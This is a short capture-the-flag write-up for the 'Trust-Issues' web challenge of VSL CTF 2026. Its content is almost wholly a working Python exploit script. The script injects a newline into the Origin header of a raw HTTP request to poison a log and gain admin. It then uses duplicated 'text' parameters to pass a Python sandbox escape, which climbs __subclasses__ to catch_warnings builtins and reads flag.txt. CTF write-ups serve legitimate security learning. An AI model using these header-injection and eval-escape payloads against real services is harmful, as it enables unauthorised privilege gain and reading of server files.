# Trust-Issues — VSL CTF 2026

> **Room / Challenge:** Trust-Issues (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** VSL CTF 2026
- **Challenge:** Trust-Issues (web)
- **Target / URL:** `https://vsl-ctf.com/challenges#Trust-Issues-15`
- **Points:** `194`
- **Solved:** `36`
- **Date:** `27-01-2026`

---

## Goal

Log Poisoning (to become admin) and HTTP Parameter Pollution (to execute code) and get the flag.

## My Solution

Solve script:

```python
import requests
import socket
from urllib.parse import urlparse
import time

TARGET = "http://124.197.22.141:8000"

def poison_log_raw(target_url):
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port if parsed.port else 80

    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Origin: attacker\nuser=admin\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall(payload.encode())
            s.recv(4096)
    except Exception:
        pass

def exploit():
    poison_log_raw(TARGET)

    time.sleep(1)

    s = requests.Session()

    escape_payload = (
        "[c for c in ().__class__.__base__.__subclasses__() "
        "if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('flag.txt').read()"
    )

    params = [
        ('text', '1'),
        ('text', escape_payload)
    ]

    try:
        resp = s.get(f"{TARGET}/calc", params=params)
        if "VSL{" in resp.text:
            print(resp.text.strip())
    except Exception:
        pass

if __name__ == "__main__":
    exploit()
```
